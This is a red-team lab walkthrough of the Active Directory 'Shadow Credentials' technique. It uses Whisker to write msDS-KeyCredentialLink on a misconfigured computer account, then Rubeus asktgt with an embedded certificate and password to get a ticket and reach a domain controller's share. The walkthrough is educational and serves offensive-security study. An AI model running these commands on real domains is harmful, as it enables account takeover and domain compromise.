---
description: Persistence, lateral movement
---

# Shadow Credentials

This is a quick lab to familiarize with a technique called [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) written about by [Elad Shamir](https://medium.com/@elad.shamir?source=post\_page-----8ee1a53566ab--------------------------------). This technique allows an attacker to take over an AD user or computer account if the attacker can modify the target AD object's (user or computer account) attribute `msDS-KeyCredentialLink`.

Read Elad Shamir's post to learn more about the inner-workings of the technique.

## Lab Overview

* `SAC1$` - is a computer account that is misconfigured and vulnerable for a takeover. `Everyone` can edit its attribute `msDS-KeyCredentialLink`. This account is member of Domain Admins group, therefore this is the account that we will take over in this lab, to compromise the AD domain.

![Everyone is allowed to write to SAC1$ computer account object](<../../.gitbook/assets/image (1084).png>)

* `regular.user` - a low privileged user that we will use to execute the technique.
* `user-server` - computer from which the technique will be executed with privileges of `regular.user`.
* `first-dc` - domain controller that we will compromise using a compromised sac1$ computer account.

## Walkthrough

Since `Everyone` is allowed to WRITE to the `SAC1$` computer account (as mentioned in the lab overview section), we can execute the technique from any low privileged user's security context.

Let's add the shadow credentials (they will be added by modifying the `msDS-KeyCredentialLink` attribute) to the vulnerable computer account `sac1$` using the tool called [whisker](https://github.com/eladshamir/Whisker) like so:

{% code title="regular.user@first.local" %}
```
Whisker.exe add /target:sac1$
```
{% endcode %}

Below shows that whisker successfully updated the `msDS-KeyCredentialLink` attribute and effectively added shadow credentials to that account. At the same time, whisker spits out rubeus command that we can then use against the targeted account `sac1$` to reveal its NTLM hash:

![Adding shadow credentials to sac1$ computer account](<../../.gitbook/assets/image (1089).png>)

After the shadow credential has been added to the account, we can confirm that the `msDS-KeyCredentialLink` was indeed added/written to. Let's check it:

{% code title="regular.user@first.local" %}
```
get-netcomputer sac1
```
{% endcode %}

![SAC1$ with shadow credential set](<../../.gitbook/assets/image (1083).png>)

We're now ready to take over the `sac1$` computer account. Before that, let's confirm we cannot access the c$ share on the domain controller `first-dc.first.local` with `regular.user` privileges:

![Attempt to list c$ on the domain controller before shadow credentials attack - fail](<../../.gitbook/assets/image (1088).png>)

Let's now pull a TGT for `SAC1$` using the shadow credentials that we've just added and try accessing the c$ on the domain controller once again:

{% code title="regular.user@first.local" %}
```
Rubeus.exe asktgt /user:sac1$ /certificate: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 /password:"FordjX0Vp2VSncVV" /domain:first.local /dc:First-DC.first.local /getcredentials /show /ptt
```
{% endcode %}

![Attempt to list c$ on the domain controller after shadow credentials attack - success](<../../.gitbook/assets/image (1087).png>)

## References

{% embed url="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab" %}
